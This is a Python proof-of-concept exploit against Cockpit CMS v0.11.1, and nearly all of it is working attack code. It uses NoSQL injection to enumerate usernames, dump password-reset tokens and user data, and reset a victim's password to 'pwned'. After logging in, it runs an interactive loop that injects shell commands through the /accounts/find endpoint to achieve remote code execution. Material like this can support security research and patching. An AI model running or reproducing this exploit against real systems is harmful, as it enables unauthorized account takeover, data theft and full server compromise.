# a poc for unauthenticated multiple Nosql injection and authenticated remote code execution vulnerabilities in cockpit cms v0.11.1
# recourse used for building the exploit : https://swarm.ptsecurity.com/rce-cockpit-cms/

import requests
import json
import sys
import re

try:
	usrs = []
	target = sys.argv[1]
	def userenum():
	# username enumeration in "/auth/ruestreset"
		Headers = {'Content-type': 'application/json', 'Accept': '*/*'}
		data0 = {
		"user":{
		"$func":"var_dump",
			}
		}
		data = json.dumps(data0)
		r = requests.post(target+"/auth/requestreset", data=data,headers=Headers, allow_redirects=False, verify=False)
		pattern = re.compile(r'".*"')
		usernames = pattern.findall(r.text)
		users = usernames
		for username in users:
			users = ''.join(username).strip('"')
			usrs.append(users)
			user = (f'[*] found username : {users}')
			print(user)
	

	def reqreset():
		# request a reset password token for a user to compromise "/auth/ruestreset"
		
		print("      ")
		Headers = {'Content-type': 'application/json', 'Accept': '*/*'}
		for user in usrs:
			data0 = {
			"user": f"{user}"
			}
			data = json.dumps(data0)
			requests.post(target+"/auth/requestreset", data=data, headers=Headers, allow_redirects=False, verify=False)
	
		print(f"[*] reset tokens has been requested")	

	def dmp_token():
		# dumpin the reset token for the user's "/auth/resetpassword"
		tokns = []
		Headers = {'Content-type': 'application/json', 'Accept': '*/*'}
		data0 = {
		"token":{
		"$func":"var_dump",
			}
		}
		data = json.dumps(data0)
		r = requests.post(target+"/auth/resetpassword", headers=Headers, data=data, allow_redirects=False, verify=False)
		pattern = re.compile(r'".*"')
		tokens = pattern.findall(r.text)
		# getting user_info
		for tokn in tokens:
			token =  ''.join(tokn).strip('"')
			tokns.append(token)
		
		for token in tokns:
			headers = {'Content-type': 'application/json', 'Accept': '*/*'}
			data1 = {
			"token": f"{token}"
			}
			data3 = json.dumps(data1)
			r = requests.post(target+"/auth/newpassword", headers=headers, data=data3, allow_redirects=False,verify=False)
			pattern1 = re.compile(r'(this.user\s*=)([^;]+)', re.I)
			info = pattern1.finditer(r.text)
			print("[*] compromised users information: \n")
			for i in info:
				user_info = json.loads(i.group(2))
				for info , data in user_info.items():
					print(f"[*] {info} : {data} ".replace("_reset_token", "token"))

	def reset():
		global usr

		headers = {'Content-type': 'application/json', 'Accept': '*/*'}
		print("\t")
		usr = input("[+] username to compromise: ")
		token = input(f"[+] {usr}'s token: ")

		data0 = {
		"token": f"{token}",
		"password": "pwned",
		}

		data = json.dumps(data0)
		r = requests.post(target+"/auth/resetpassword", data=data, headers=headers, allow_redirects=False, verify=False)
		if "Password updated" in r.text:
			print(f"[*] password updated successfully \n[*] new creds: {usr}:pwned")
		else:
			print("[-] password reset failed")


	def pwn():
		# authenticated remote code execution "/accounts/find"
		headers = {'Content-type': 'application/json', 'Accept': '*/*'}

		data0 = {
		"auth":{
			"user": f"{usr}",
			"password": "pwned",
			},
			"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
		}

		data = json.dumps(data0)
		
		r1 = requests.post(target+"/auth/check", data=data, verify=False, allow_redirects=False, headers=headers)	
	

		if "true" in r1.text:
			print("[*] logged in successfully")
			print("[*] pwn3d ;)")
			while True:
				command = input("[+] Command: ")
				print("\t")
				cookie = r1.cookies["40d1b2d83998fabacb726e5bc3d22129"]
		
				payload = f"die(`{command}`)" # ip and port = sys.argv
				data1 = {
				"options":{
					"filter":{
						f"' + {payload} + '":0
						}
					}
				}

				data2 = json.dumps(data1)
				r = requests.post(target+"/accounts/find", data=data2,cookies={"40d1b2d83998fabacb726e5bc3d22129":cookie}, headers=headers, allow_redirects=False, verify=False)
				print(r.text)
	userenum()
	reqreset()
	dmp_token()
	reset()
	pwn()

except KeyboardInterrupt:
	print("\n[-] exited")
except IndexError:
	print("[+] usage: python3 http://TARGET_IP\n[+] DO NOT USE / AT THE END OF THE URL")